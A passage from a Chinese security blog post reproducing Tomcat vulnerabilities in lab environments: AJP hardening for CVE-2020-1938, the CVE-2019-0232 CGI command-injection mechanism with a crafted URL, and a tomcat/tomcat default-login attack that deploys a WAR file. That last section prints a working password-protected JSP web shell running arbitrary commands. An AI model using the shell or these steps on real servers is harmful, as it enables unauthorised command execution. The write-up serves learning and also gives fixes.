</tbody></table>
<ul>
<li>若不需要使用Tomcat AJP协议，可直接关闭AJP Connector，或将其监听地址改为仅监听本机localhost。<br>具体操作：在/conf/server.xml文件中，注释或者删除。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8009&quot;</span><span class="attr">protocol</span>=<span class="string">&quot;AJP/1.3&quot;</span> <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>若需使用Tomcat AJP协议，可根据使用版本配置协议属性设置认证凭证。<br>使用Tomcat 7和Tomcat 9的用户可为AJP Connector配置secret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8009&quot;</span><span class="attr">protocol</span>=<span class="string">&quot;AJP/1.3&quot;</span> <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span><span class="attr">address</span>=<span class="string">&quot;YOUR_TOMCAT_IP_ADDRESS&quot;</span> <span class="attr">secret</span>=<span class="string">&quot;YOUR_TOMCAT_AJP_SECRET&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
使用Tomcat 8的用户可为AJP Connector配置requiredSecret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8009&quot;</span><span class="attr">protocol</span>=<span class="string">&quot;AJP/1.3&quot;</span> <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span><span class="attr">address</span>=<span class="string">&quot;YOUR_TOMCAT_IP_ADDRESS&quot;</span><span class="attr">requiredSecret</span>=<span class="string">&quot;YOUR_TOMCAT_AJP_SECRET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><a target="_blank" rel="noopener" href="http://blog.nsfocus.net/cve-2020-1938/">【威胁通告】APACHE TOMCAT 文件包含漏洞（CVE-2020-1938）</a></li>
</ul>
<h1 id="CVE-2019-0232远程代码执行"><a href="#CVE-2019-0232远程代码执行" class="headerlink" title="CVE-2019-0232远程代码执行"></a>CVE-2019-0232远程代码执行</h1><h2 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote>
<p>Apache官方发布通告称将在最新版本中修复一个远程代码执行漏洞（CVE-2019-0232），由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击。<br>触发该漏洞需要同时满足以下条件：<br>1.系统为Windows<br>2.启用了CGI Servlet（默认为关闭）<br>3.启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）</p>
</blockquote>
<h2 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞相关的代码在 tomcat\java\org\apache\catalina\servlets\CGIServlet.java 中， CGIServlet提供了一个cgi的调用接口，在启用 enableCmdLineArguments 参数时，会根据 RFC 3875来从Url参数中生成命令行参数，并把参数传递至Java的 Runtime 执行。这个漏洞是 因为 Runtime.getRuntime().exec 在Windows中和Linux中底层实现不同导致的 Java 的Runtime.getRuntime().exec 在CGI调用这种情况下很难有命令注入。而Windows中创 建进程使用的是 CreateProcess ，会将参数合并成字符串，作为 lpComandLine 传 入 CreateProcess 。程序启动后调用 GetCommandLine 获取参数，并调 用 CommandLineToArgvW 传至 argv。在Windows中，当 CreateProcess 中的参数为 bat 文件或是 cmd 文件时，会调用 cmd.exe , 故最后会变成 cmd.exe /c “arg.bat &amp; dir “ ，而 Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞。</p>
<h2 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote>
<p>Apache Tomcat 9.0.0.M1 to 9.0.17<br>Apache Tomcat 8.5.0 to 8.5.39<br>Apache Tomcat 7.0.0 to 7.0.93</p>
</blockquote>
<h2 id="复现过程-2"><a href="#复现过程-2" class="headerlink" title="复现过程"></a>复现过程</h2><p>安装Tomcat 8.5.39<a target="_blank" rel="noopener" href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.39/bin/apache-tomcat-8.5.39-windows-x64.zip">下载</a><br>下载完后解压进入bin目录，运行startup.bat<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927230453334.png" alt="image-20210927230453334"><br>访问<a target="_blank" rel="noopener" href="http://localhost:8080/,%E5%90%AF%E5%8A%A8%E6%88%90%E5%8A%9F%EF%BC%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%AE%8C%E6%88%90%E3%80%82">http://localhost:8080/,启动成功，环境搭建完成。</a><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927230531632.png" alt="image-20210927230531632"><br>1.Tomcat的 CGI_Servlet组件默认是关闭的，在 conf/web.xml 中找到注释的CGIServlet部分，去掉注释，并配置enableCmdLineArguments和executadle。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210928001242341.png" alt="image-20210928001242341"><br>2.同时还要修改web.xml以下配置，否则访问cgi目录会提示404。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927231342630.png" alt="image-20210927231342630"><br>3.打开Tomcat安装目录的apache-tomcat-8.5.39\conf\context.xml修改如下配置，添加privileged=”true” 。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927231651199.png" alt="image-20210927231651199"><br>4.在解压目录\webapps\ROOT\WEB-INF目录新建一个cgi-bin文件夹，创建一个test.bat的文件，内容如下：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> Content-<span class="built_in">Type</span>: text/plain</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">set</span> foo=<span class="variable">%~1</span></span><br><span class="line"><span class="variable">%</span>foo%</span><br></pre></td></tr></table></figure>
<p>访问<a target="_blank" rel="noopener" href="http://localhost:8080/cgi-bin/hello.bat?&C:%5CWindows%5CSystem32%5Cnet.exe+user">http://localhost:8080/cgi-bin/hello.bat?%26C%3A%5CWindows%5CSystem32%5Cnet.exe+user</a><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210928001545777.png" alt="image-20210928001545777"><br>并没有执行成功，暂时还不知道那个环节出问题了。。。。（先留着，后续再看看）</p>
<h2 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h2><p>1.将版本升级至最新版本。<br>2.将CGI Servlet初始化参数enableCmdLineArguments设置为false来进行防护。<br>操作：<br>在Tomcat安装路径的conf文件夹下，使用编辑器打开web.xml，找到enableCmdLineArguments参数部分，添加如下配置：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>enableCmdLineArguments<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/liliyuanshangcao/p/10731966.html">Apache Tomcat 远程代码执行漏洞（CVE-2019-0232）漏洞复现</a></p>
<h1 id="Tomcat8弱口令-war包部署"><a href="#Tomcat8弱口令-war包部署" class="headerlink" title="Tomcat8弱口令+war包部署"></a>Tomcat8弱口令+war包部署</h1><h2 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote>
<p>在tomcat8环境下默认进入后台的密码为tomcat/tomcat，未修改造成未授权即可进入后台。</p>
</blockquote>
<h2 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote>
<p>跟版本没有关系，如果后台密码是弱口令且有权限访问后台目录，则都受影响。</p>
</blockquote>
<h2 id="复现过程-3"><a href="#复现过程-3" class="headerlink" title="复现过程"></a>复现过程</h2><p>环境：vulhub<br>启动docker后，进入目录可以看到漏洞环境，后台密码是tomcat/tomcat。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927142822722.png" alt="image-20210927142822722"><br>访问<a target="_blank" rel="noopener" href="http://192.168.255.128:8081/">http://192.168.255.128:8081/</a><br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927143322665.png" alt="image-20210927143322665"><br>进入后台目录，输入tomcat/tomcat，成功进入后台。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927143453130.png" alt="image-20210927143453130"><br>制作war包：<code>jar -cvf 2.war 1.jsp</code><br>1.jsp文件内容为：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  out.println(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="string">&quot;123&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">    java.io.InputStream in=</span><br><span class="line">Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] b= <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>部署后的1.jsp在/2目录下。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927144124641.png" alt="image-20210927144124641"><br>访问即可getshell。<br><img src="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/image-20210927144242754.png" alt="image-20210927144242754"></p>
<h2 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h2><p>禁止后台登录使用弱口令；限制访问后台的权限。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Tomcat存在的漏洞有很多，这里总结主要是对一些常见的漏洞复现和分析（主要是vulhub上的环境）当然了目前网上都有很多自动化的检测和利用工具，这里手动验证是为了加深印象；漏洞的原理很多都是参考大佬们的文章，个人其实还是有很多不是很理解（菜狗）这里对大佬们表示衷心的感谢。后续继续补充其他漏洞复现。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">1ance</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.1ance.xyz/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/">https://blog.1ance.xyz/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.1ance.xyz" target="_blank">1ance's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a><a class="post-meta__tags" href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">中间件</a><a class="post-meta__tags" href="/tags/Tomcat/">Tomcat</a></div><div class="post_share"><div class="social-share" data-image="/2021/09/26/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/tomcat.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/10/02/weblogic%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/"><img class="prev-cover" src="/2021/10/02/weblogic%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/weblogic.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">weblogic漏洞总结复现</div></div></a></div><div class="next-post pull-right"><a href="/2021/09/25/CVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><img class="next-cover" src="/2021/09/25/CVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/bg.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CVE-2021-40444漏洞复现</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/10/08/JBoss漏洞总结复现/" title="JBoss漏洞总结复现"><img class="cover" src="/2021/10/08/JBoss%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/jboss.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-08</div><div class="title">JBoss漏洞总结复现</div></div></a></div><div><a href="/2021/10/02/weblogic漏洞总结复现/" title="weblogic漏洞总结复现"><img class="cover" src="/2021/10/02/weblogic%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/weblogic.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-02</div><div class="title">weblogic漏洞总结复现</div></div></a></div><div><a href="/2021/09/25/CVE-2021-40444漏洞复现/" title="CVE-2021-40444漏洞复现"><img class="cover" src="/2021/09/25/CVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-25</div><div class="title">CVE-2021-40444漏洞复现</div></div></a></div><div><a href="/2021/09/07/ThinkPHP漏洞总结复现/" title="ThinkPHP漏洞总结复现"><img class="cover" src="/2021/09/07/ThinkPHP%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/thinkphp.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-07</div><div class="title">ThinkPHP漏洞总结复现</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/header.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">1ance</div><div class="author-info__description">Come and study with me!</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/bug20" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:w1ance@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/img/wechat.png" target="_blank" title="微信"><i class="fab fa-weixin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎光顾我的博客！https://blog.csdn.net/weixin_44033675</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E5%8F%8A%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">Tomcat目录结构及介绍</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2017-12615%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.</span> <span class="toc-text">CVE-2017-12615任意文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">2.3.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-number">2.4.</span> <span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">2.5.</span> <span class="toc-text">修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.6.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2020-1938%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">3.</span> <span class="toc-text">CVE-2020-1938文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="toc-number">3.3.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-1"><span class="toc-number">3.4.</span> <span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">3.5.</span> <span class="toc-text">修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-number">3.6.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2019-0232%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">4.</span> <span class="toc-text">CVE-2019-0232远程代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-2"><span class="toc-number">4.3.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-2"><span class="toc-number">4.4.</span> <span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-2"><span class="toc-number">4.5.</span> <span class="toc-text">修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-2"><span class="toc-number">4.6.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat8%E5%BC%B1%E5%8F%A3%E4%BB%A4-war%E5%8C%85%E9%83%A8%E7%BD%B2"><span class="toc-number">5.</span> <span class="toc-text">Tomcat8弱口令+war包部署</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-3"><span class="toc-number">5.2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-3"><span class="toc-number">5.3.</span> <span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-3"><span class="toc-number">5.4.</span> <span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/11/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="内网渗透|域环境搭建"><img src="/2021/11/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透|域环境搭建"/></a><div class="content"><a class="title" href="/2021/11/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="内网渗透|域环境搭建">内网渗透|域环境搭建</a><time datetime="2021-11-24T08:03:53.000Z" title="发表于 2021-11-24 16:03:53">2021-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="内网渗透|信息收集"><img src="/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透|信息收集"/></a><div class="content"><a class="title" href="/2021/11/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="内网渗透|信息收集">内网渗透|信息收集</a><time datetime="2021-11-24T07:34:13.000Z" title="发表于 2021-11-24 15:34:13">2021-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-powershell-wmic%E8%AF%A6%E8%A7%A3/" title="内网渗透|powershell&amp;wmic详解"><img src="/2021/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-powershell-wmic%E8%AF%A6%E8%A7%A3/bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透|powershell&amp;wmic详解"/></a><div class="content"><a class="title" href="/2021/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-powershell-wmic%E8%AF%A6%E8%A7%A3/" title="内网渗透|powershell&amp;wmic详解">内网渗透|powershell&amp;wmic详解</a><time datetime="2021-11-21T09:03:32.000Z" title="发表于 2021-11-21 17:03:32">2021-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E7%A1%80%E7%AF%87%E5%B8%B8%E7%94%A8%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/" title="内网渗透|基础篇常用名词解释"><img src="/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透|基础篇常用名词解释"/></a><div class="content"><a class="title" href="/2021/11/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E7%A1%80%E7%AF%87%E5%B8%B8%E7%94%A8%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/" title="内网渗透|基础篇常用名词解释">内网渗透|基础篇常用名词解释</a><time datetime="2021-11-16T05:36:00.000Z" title="发表于 2021-11-16 13:36:00">2021-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/07/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%B7%A5%E5%85%B7%E7%AF%87%E4%B9%8Bmimikatz/" title="内网渗透|工具篇之mimikatz"><img src="/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透|工具篇之mimikatz"/></a><div class="content"><a class="title" href="/2021/11/07/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%B7%A5%E5%85%B7%E7%AF%87%E4%B9%8Bmimikatz/" title="内网渗透|工具篇之mimikatz">内网渗透|工具篇之mimikatz</a><time datetime="2021-11-07T13:47:54.000Z" title="发表于 2021-11-07 21:47:54">2021-11-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 1ance</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://blog.1ance.xyz">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas 